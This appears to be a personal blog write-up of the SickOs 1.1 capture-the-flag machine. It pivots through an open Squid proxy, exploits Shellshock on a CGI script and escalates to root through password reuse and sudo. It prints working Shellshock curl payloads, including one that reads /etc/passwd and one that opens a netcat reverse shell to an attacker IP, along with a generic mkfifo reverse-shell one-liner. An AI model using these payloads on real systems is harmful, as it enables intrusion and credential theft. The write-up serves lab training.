---
layout: default
title : muzec - SickOs 1.1 Writeup
---

![Image](https://imgur.com/696H8mc.png)

We always start with an nmap scan.....

```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-20 05:02 EDT
Nmap scan report for 172.16.109.131
Host is up (0.00050s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
3128/tcp open   http-proxy Squid http proxy 3.1.19
|_http-server-header: squid/3.1.19
|_http-title: ERROR: The requested URL could not be retrieved
8080/tcp closed http-proxy
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.57 seconds
```

Just 2 open ports and port 8080 is closed but we are having some strange port which is port 3128 Http-Proxy Squid Http proxy 3.1.19 cool let do some research on it.

A exposed Squid proxy will usually allow an attacker to make requests on their behalf. 

If misconfigured, this may give the attacker information about devices that they cannot normally reach. For example, an attacker may be able to make requests for internal IP addresses against an open Squid proxy exposed to the Internet, therefore performing a port scan against the internal network. The `auxiliary/scanner/http/open_proxy` module can be used to test for open proxies, though a Squid proxy does not have to be on the open Internet in order to allow for pivoting (e.g. an Intranet Squid proxy which allows the attack to pivot to another part of the internal network). 

This module will not be able to scan network ranges or ports denied by Squid ACLs. Fortunately it is possible to detect whether a host was up and the port was closed, or if the request was blocked by an ACL, based on the response Squid gives. 

This feedback is provided to the user in meterpreter `VERBOSE` output, otherwise only open and permitted ports are printed. 

![Image](https://imgur.com/PrB1vZ2.png)

Now let hit exploit.

![Image](https://imgur.com/pdlVDGQ.png)

Cool seems we have port 80 alive now let use foxyproxy to check it in our browser.

![Image](https://imgur.com/h85lYOn.png)

Select the new proxy we just created.

![Image](https://imgur.com/NQZNzZz.png)

Now let try to access the IP now and boom we are in.

![Image](https://imgur.com/X6oIfEd.png)

Now let scan it with Nikto using `nikto -h 172.16.109.131 --useproxy 172.16.109.131:3128` .

![Image](https://imgur.com/bpmSNTh.png)

Going through the output something interesting came up `/cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability` really let confirm it first.

`curl --proxy 172.16.109.131:3128 -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://172.16.109.131/cgi-bin/status`

And boom we have the passwd file.

![Image](https://imgur.com/ZLDP8gp.png)

Now let try and get a reverse shell with `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f` Note edit the port and IP and also start an ncat listener.

`curl --proxy 172.16.109.131:3128 -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.16.109.1 4444 >/tmp/f'" http://172.16.109.131/cgi-bin/status`

And we should have our shell back to our terminal.

![Image](https://imgur.com/c9gnf5S.png)

Now let spawn a TTY shell `python -c 'import pty; pty.spawn ("/bin/bash")'`  and we are good to go without wasting to much of time i get linpeas.sh on to the target machine.

![Image](https://imgur.com/M8jirGi.png)

![Image](https://imgur.com/i7j8Q2M.png)

`wget 172.16.109.1:8000/linpeas.sh`

`chmod +x linpeas.sh`

Now let it fly and wait for the output.

![Image](https://imgur.com/s0PERvq.png)

Now let go through it so i found a config file probably some MYSQL credentials but let check it out.

![Image](https://imgur.com/JSwbRbU.png)

Cool some juicy credentials let try it.

![Image](https://imgur.com/xmJQJzT.png)

So i use it to log into MYSQL but nothing ineteresting in it so i try use the password for sickos yes password reuse is possible.

![Image](https://imgur.com/zaiQ825.png)

Oh yes we are in let check`sudo -l` maybe it our lucky day.

![Image](https://imgur.com/UoY45oI.png)

Ahhh yes it is our luckdy and we are root let read the flag in the root directory.

![Image](https://imgur.com/f0xTAid.png)

Box rooted.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>

